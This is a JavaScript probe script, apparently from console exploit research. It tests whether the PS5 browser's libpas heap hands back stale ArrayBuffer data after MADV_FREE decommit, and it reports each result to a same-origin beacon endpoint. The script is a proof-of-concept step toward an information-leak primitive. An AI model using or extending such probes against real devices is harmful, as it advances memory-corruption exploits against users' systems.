// p230 — libpas stale heap data reuse via MADV_FREE + NOP commit
//
// PS5 platform: decommit = MADV_FREE (lazy), commit = NOP
// With Gigacage disabled, ArrayBuffer backing stores and JS objects share heap
// If kernel hasn't reclaimed physical pages after decommit, newly allocated
// objects in the same pages will contain stale ArrayBuffer data
//
// Test: fill ArrayBuffers with marker pattern, free them, force scavenger,
// allocate new objects in same size class, check for stale markers
//
// Beacon prefix: V230-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V230-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  // Test A: Stale data detection in same-size reallocation
  // Allocate ArrayBuffers, fill with marker, release, reallocate as objects
  try {
    var MARKER = 0x41414141;
    var SIZE = 64;
    var COUNT = 4096;
    var buffers = [];

    // Phase 1: allocate and fill with marker pattern
    for (var i = 0; i < COUNT; i++) {
      var ab = new ArrayBuffer(SIZE);
      var view = new Uint32Array(ab);
      for (var j = 0; j < view.length; j++) {
        view[j] = MARKER;
      }
      buffers.push(ab);
    }
    BS('A-FILLED-' + COUNT);

    // Phase 2: release all buffers
    buffers = null;

    // Phase 3: pressure GC to collect and trigger scavenger
    // Multiple GC cycles to ensure collection + scavenger decommit
    for (var cycle = 0; cycle < 5; cycle++) {
      var pressure = [];
      for (var i = 0; i < 10000; i++) {
        pressure.push(new ArrayBuffer(256));
      }
      pressure = null;
    }
    BS('A-GC-PRESSURE');

    // Phase 4: wait for scavenger (it runs on a timer)
    // We can't directly trigger it, but allocation pressure helps
    var delay = Date.now();
    while (Date.now() - delay < 200) {} // spin 200ms for scavenger
    BS('A-WAITED');

    // Phase 5: allocate new ArrayBuffers in same size class
    // Check if any contain stale marker data
    var staleCount = 0;
    var newBuffers = [];
    for (var i = 0; i < COUNT; i++) {
      var ab = new ArrayBuffer(SIZE);
      var view = new Uint32Array(ab);
      for (var j = 0; j < view.length; j++) {
        if (view[j] === MARKER) {
          staleCount++;
          break;
        }
      }
      newBuffers.push(ab);
    }

    if (staleCount > 0) {
      BS('A-STALE-FOUND-' + staleCount);
    } else {
      BS('A-NO-STALE');
    }
    newBuffers = null;
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 40));
  }

  // Test B: Stale data with different allocation sizes
  // Fill 128-byte buffers, free, allocate objects that would land in same pages
  try {
    var MARKER2 = 0xDEADBEEF;
    var SIZE2 = 128;
    var COUNT2 = 2048;
    var buffers2 = [];

    for (var i = 0; i < COUNT2; i++) {
      var ab = new ArrayBuffer(SIZE2);
      var view = new Uint32Array(ab);
      for (var j = 0; j < view.length; j++) {
        view[j] = MARKER2;
      }
      buffers2.push(ab);
    }
    BS('B-FILLED');

    buffers2 = null;

    // GC + scavenger pressure
    for (var cycle = 0; cycle < 3; cycle++) {
      var p = [];
      for (var i = 0; i < 5000; i++) p.push(new ArrayBuffer(512));
      p = null;
    }
    var d = Date.now();
    while (Date.now() - d < 300) {}

    // Allocate plain objects (which go through bmalloc/libpas)
    // On PS5 with Gigacage off, object backing stores share the heap
    var stale2 = 0;
    var objects = [];
    for (var i = 0; i < COUNT2; i++) {
      var obj = {a:1, b:2, c:3, d:4, e:5, f:6, g:7, h:8,
                 i:9, j:10, k:11, l:12, m:13, n:14, o:15, p:16};
      objects.push(obj);
    }

    // Can't directly inspect object backing store from JS
    // But we can allocate new ArrayBuffers and check those
    var checkBufs = [];
    for (var i = 0; i < COUNT2; i++) {
      var ab = new ArrayBuffer(SIZE2);
      var view = new Uint32Array(ab);
      for (var j = 0; j < view.length; j++) {
        if (view[j] === MARKER2) {
          stale2++;
          break;
        }
      }
      checkBufs.push(ab);
    }

    if (stale2 > 0) {
      BS('B-STALE-FOUND-' + stale2);
    } else {
      BS('B-NO-STALE');
    }
    objects = null;
    checkBufs = null;
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 40));
  }

  // Test C: Transfer-based detach + reallocation race
  // ArrayBuffer.transfer detaches the source, creating a freed backing store
  // that might be reused before GC runs
  try {
    var MARKER3 = 0xCAFEBABE;
    var transferred = [];
    var originals = [];

    for (var i = 0; i < 1000; i++) {
      var ab = new ArrayBuffer(64);
      var view = new Uint32Array(ab);
      for (var j = 0; j < view.length; j++) view[j] = MARKER3;
      originals.push(ab);
    }

    // Transfer detaches originals immediately
    if (typeof ArrayBuffer.prototype.transfer === 'function') {
      for (var i = 0; i < originals.length; i++) {
        transferred.push(originals[i].transfer());
      }
      BS('C-TRANSFERRED');

      // Original backing stores are freed by transfer
      // Immediately allocate new buffers to try to reuse the freed memory
      var stale3 = 0;
      for (var i = 0; i < 1000; i++) {
        var ab = new ArrayBuffer(64);
        var view = new Uint32Array(ab);
        for (var j = 0; j < view.length; j++) {
          if (view[j] === MARKER3) {
            stale3++;
            break;
          }
        }
      }

      if (stale3 > 0) {
        BS('C-STALE-FOUND-' + stale3);
      } else {
        BS('C-NO-STALE');
      }
    } else {
      BS('C-NO-TRANSFER');
    }
    transferred = null;
    originals = null;
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 40));
  }

  // Test D: Scavenger timing probe
  // Measure how long until scavenger decommits by watching for zero-fill
  try {
    var SIZE4 = 4096;
    var ab = new ArrayBuffer(SIZE4);
    var view = new Uint32Array(ab);
    for (var j = 0; j < view.length; j++) view[j] = 0xBBBBBBBB;
    var savedRef = view; // keep view but not buffer ref

    // Force the ArrayBuffer to be the only thing keeping memory alive
    ab = null;
    // GC pressure
    for (var i = 0; i < 50000; i++) new ArrayBuffer(128);

    // Check if the view's buffer was collected / detached
    try {
      var val = savedRef[0];
      if (val === 0xBBBBBBBB) {
        BS('D-STILL-ALIVE');
      } else if (val === 0) {
        BS('D-ZEROED');
      } else {
        BS('D-CHANGED-' + hex(val));
      }
    } catch (e2) {
      BS('D-DETACHED');
    }
    savedRef = null;
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 40));
  }

  BS('DONE');
})();
